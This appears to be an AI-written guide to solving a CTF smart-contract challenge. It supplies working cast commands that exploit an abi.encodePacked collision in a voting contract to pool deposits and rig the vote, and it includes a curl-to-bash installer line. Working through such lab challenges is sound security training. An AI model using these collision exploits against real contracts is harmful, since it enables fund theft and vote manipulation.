# SUMMARY - How to Get the Flag

## Current Situation

The challenge server at `94.237.62.103:34182` is accepting connections but not sending responses. This typically means:

1. **The Docker instance may have expired** - Most CTF challenge instances run for a limited time (30-60 minutes)
2. **You need to restart the instance** from the CTF platform web interface

## What To Do Now

### Step 1: Restart the Docker Instance

Go to the CTF challenge page and look for:
- A "Restart Instance" button
- A "Spawn Docker" button  
- Or the challenge may have timed out and you need to start a fresh one

After restarting, you'll get NEW IP addresses and ports.

### Step 2: Get Your Connection Info

Once the instance is running, connect:
```bash
nc <NEW_IP> <NEW_PORT>
```

Select option **1** to get:
- Your private key
- Setup contract address
- Target contract address
- RPC URL

### Step 3: Execute the Exploit

Use the **quick_exploit.sh** script in this directory:

```bash
chmod +x quick_exploit.sh
./quick_exploit.sh
```

When prompted, enter:
- Your private key (from step 2)
- Target contract address (from step 2)

OR manually run these commands:

```bash
export PRIVATE_KEY="your_key_from_step_2"
export TARGET="target_address_from_step_2"  
export RPC="rpc_url_from_step_2"

# Deposit 500 ETH as ("A", "B")
cast send $TARGET "depositVoteCollateral(string,string)" "A" "B" \
  --value 500ether --private-key $PRIVATE_KEY --rpc-url $RPC

# Deposit 500 ETH as ("AB", "") - same signature!
cast send $TARGET "depositVoteCollateral(string,string)" "AB" "" \
  --value 500ether --private-key $PRIVATE_KEY --rpc-url $RPC

# Vote for CIM with combined 1000 ETH weight  
cast send $TARGET "vote(bytes3,string,string)" \
  0x43494d0000000000000000000000000000000000000000000000000000000000 \
  "A" "B" \
  --private-key $PRIVATE_KEY --rpc-url $RPC
```

### Step 4: Get the Flag

Connect again:
```bash
nc <IP> <PORT>
```

Select option **3** to retrieve your flag!

---

## The Exploit Explained (For Understanding)

### Vulnerability
The contract uses `abi.encodePacked(name, surname)` to create a voter signature, but checks uniqueness with nested mappings `uniqueVoters[name][surname]`.

Since `abi.encodePacked` concatenates without delimiters:
- `("A", "B")` → `"AB"`
- `("AB", "")` → `"AB"` (SAME!)

### Attack
1. Deposit 500 ETH as `("A", "B")` → Sets `voters["AB"].weight = 500`
2. Deposit 500 ETH as `("AB", "")` → Adds to `voters["AB"].weight = 1000`  
3. Vote for CIM with `("A", "B")` → Uses weight of 1000 ETH
4. CIM reaches 1000 ETH target and wins!

---

## Files You Can Use

All exploitation tools are ready:

- **WALKTHROUGH.md** - Step-by-step guide with all commands
- **SOLUTION.md** - Detailed technical explanation
- **quick_exploit.sh** - Automated bash script (needs Foundry/cast)
- **exploit.py** - Python script with web3.py
- **auto_exploit.py** - Interactive Python script
- **Exploit.sol** - Solidity contract (can deploy and call)

---

## Installation Requirements

If you don't have Foundry installed:

```bash
# Install Foundry
curl -L https://foundry.paradigm.xyz | bash
foundryup

# Verify installation
cast --version
```

Or use Python with web3:
```bash
pip install web3
python3 auto_exploit.py
```

---

## Expected Flag Format

```
HTB{some_hash_or_text_here}
```

Once you get it, submit on the CTF platform!

---

## Need Help?

If the exploit doesn't work:

1. **Verify the instance is running** - Check the CTF platform
2. **Check you have the right addresses** - Double-check copy-paste
3. **Ensure you have enough ETH** - The instance should give you 1000+ ETH
4. **Try different collision pairs**:
   - `("X", "Y")` + `("XY", "")`  
   - `("Test", "User")` + `("TestU", "ser")`

The concept is the same - find two name/surname pairs that produce identical `abi.encodePacked()` results!

---

**Good luck! You have all the tools you need. Just restart the Docker instance and run the exploit! 🚀**
